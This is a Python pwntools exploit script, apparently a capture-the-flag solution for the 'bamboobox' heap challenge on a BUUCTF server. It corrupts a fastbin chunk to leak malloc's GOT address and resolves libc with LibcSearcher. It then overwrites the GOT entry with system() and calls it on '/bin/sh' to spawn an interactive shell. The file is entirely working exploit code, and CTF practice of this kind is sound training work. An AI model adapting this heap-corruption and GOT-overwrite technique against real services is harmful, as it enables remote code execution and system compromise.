from pwn import *
from LibcSearcher import LibcSearcher
import sys

io = -1
############################
#********修改文件名**********
############################
file_name = 'bamboobox'
port = 27974

###########修改宏###########
DEBUG = 1
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if len(sys.argv) > 1 and sys.argv[1].isdigit():
    io = remote('node3.buuoj.cn', int(sys.argv[1]))
    DEBUG = False
    def STOP(*args):
        pass
elif DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    def STOP(idx:str = 0):
        input('stop{} ===> {}'.format(idx, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)
    DEBUG = False
    def STOP(*args):
        pass

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libc))

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
context.update(os='linux', arch='amd64', log_level='debug', endian='little')

'''
fast bin sttack
'''
def show_items():
    global io
    io.sendlineafter(b"Your choice:", b'1')
    return io.recvuntil(b"----------------------------\n")

def add_item(length:int, content:bytes=b'\x00'):
    global io
    io.sendlineafter(b"Your choice:", b'2')
    io.sendlineafter(b"Please enter the length of item name:", str(length).encode())
    io.sendafter(b"Please enter the name of item:", content)

def change_item(idx:int, length:int, content:bytes=b'\x00'):
    global io
    io.sendlineafter(b"Your choice:", b'3')
    io.sendlineafter(b"Please enter the index of item:", str(idx).encode())
    io.sendlineafter(b"Please enter the length of item name:", str(length).encode())
    io.sendafter(b"Please enter the new name of the item:", content)

def remove_item(idx:int):
    global io
    io.sendlineafter(b"Your choice:", b'4')
    io.sendlineafter(b"Please enter the index of item:", str(idx).encode())
    io.recvuntil(b"remove successful!!\n")

add_item(0x20)
add_item(0x10)
add_item(0x10, b'/bin/sh\x00')

remove_item(1)

payload = p64(0) * 5 + p64(0x21) + p64(0x6020b8)
change_item(0, 0x40, payload)

add_item(0x10)
func_name = 'malloc'
add_item(0x10, p64(io_elf.got[func_name]) + b'/bin/sh\x00')

msg = show_items()
print(msg)
leak_func_addr = msg[4:10]
leak_func_addr = u64(leak_func_addr.ljust(8, b'\x00'))
LOG_ADDR_SUCCESS(func_name, leak_func_addr)

libc = LibcSearcher(func_name, leak_func_addr)
libc_base_addr = leak_func_addr - libc.dump(func_name)
system_addr = libc_base_addr + libc.dump('system')
LOG_ADDR_SUCCESS('libc_base_addr', libc_base_addr)
LOG_ADDR_SUCCESS('system_addr', system_addr)

# STOP()
gdaget = [0x45206, 0x4525a, 0xef9f4, 0xf0897]
one_gadget = libc_base_addr + gdaget[3]
change_item(0, 0x8, p64(system_addr))
LOG_ADDR_SUCCESS('one_gadget', one_gadget)
STOP()
io.sendlineafter(b"Your choice:", b'2')
io.sendlineafter(b"Please enter the length of item name:", str(0x6020d0).encode())
io.interactive()
